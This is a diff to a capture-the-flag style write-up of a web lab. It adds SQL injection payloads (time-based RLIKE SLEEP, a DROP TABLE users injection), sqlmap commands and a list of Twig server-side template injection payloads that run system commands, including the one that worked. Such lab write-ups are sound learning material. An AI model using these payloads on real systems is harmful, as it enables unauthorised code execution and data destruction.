@@ -14,7 +14,7 @@ $ gobuster dir -u http://<target> -w /usr/share/wordlists/seclists/Discovery/Web
 
 ...
 
-Interesting files: `composer.lock`, **`composer.json`**
+Interesting files: `composer.lock`, `composer.json`
 
 From `composer.json`, I found out that the application uses Twig.
 
@@ -152,6 +152,11 @@ SELECT * FROM table WHERE username = ''||1=1'-- AND password = '1'
 
 ```sh
 $ sqlmap -r login.txt --risk=3 --level=5
+```
+
+I found that the following payload to the username field works too:
+
+```sql
 ' RLIKE SLEEP(3) -- n 
 ```
 
@@ -215,7 +220,77 @@ UPDATE table SET gold = 1 WHERE 1=1; DROP TABLE users;-- , bronze = x WHERE id =
 
 Sqlmap:&#x20;
 
-```
+```sh
 $ sqlmap -r leaderboard.txt -p gold,silver,bronze --dbms=mysql 
 ```
 
+### SSTI injection on the admin profile page
+
+The following displays the request to update the admin profile page (Burp suite):
+
+```http
+POST /update_profile.php HTTP/1.1
+Host: 10.10.82.58
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 84
+Origin: http://10.10.124.140
+Connection: keep-alive
+Referer: http://10.10.124.140/update_profile.php
+Cookie: PHPSESSID=ce44rfksrc4ecbo5pkfgrje229
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+email=superadmin%40injectics.thm&fname=t&lname=t
+```
+
+Upon updating the `fname` field, it appears that the value is reflected on the profile page.
+
+#### Twig SSTI injection
+
+#### Identifying vulnerability to SSTI
+
+Using the simple test value of `{{7*7}}` shows the value `49` displayed. This shows that the application is vulnerable.
+
+From the `composer.json` file, we know that the application uses _**Twig**_ as the server-side template engine.
+
+I tried a few payloads I have found from multiple sources (refer to references below):
+
+**File read**
+
+```twig
+{{['cat index.php']|map('system')|join}} 
+"{{'index.php'|file_excerpt(1,30)}}"@ 
+```
+
+**Code execution**
+
+```twig
+{{['id']|map('shell')|join}}
+{{['id']|map('system')|join}}
+{{['id']|map('passthru')|join}}
+{{['id']|map('shell')}}
+{{['id']|map('system')}}
+{{['id']|map('passthru')}}
+
+{{['id']|filter('shell')}} 
+{{['id']|filter('system')}} 
+{{['id']|filter('passthru')}} 
+
+{{['id',""]|sort('shell')}} 
+{{['id',""]|sort('system')}} 
+{{['id',""]|sort('passthru')}} 
+```
+
+The payloads above doesn't seem to work. Finally, the following finally worked after a few iterations:
+
+```twig
+{{['id',""]|sort('passthru')}} 
+```
+
+{% embed url="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#ssti-in-go" %}
+
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md" %}
